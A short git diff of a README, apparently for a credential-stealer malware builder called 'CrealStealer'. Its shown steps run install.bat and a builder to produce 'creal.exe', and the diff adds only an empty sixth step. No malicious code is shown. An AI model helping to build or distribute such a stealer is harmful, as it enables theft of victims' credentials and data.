@@ -84,6 +84,7 @@
 3. First install reqiured packages by double clicking `install.bat` file
 4. the builder will start after automatically
 5. Follow instructions in builder and your exe will be found in the `dist` folder under the name `creal.exe`
+6. 
                                                      ☭ How to build
    
 <div align="center"><img style="display: block; margin-left: auto; margin-right: auto; width: 65%;" src="https://raw.githubusercontent.com/leandrosanchs/CrealStealer/main/img/builder.png"></img>
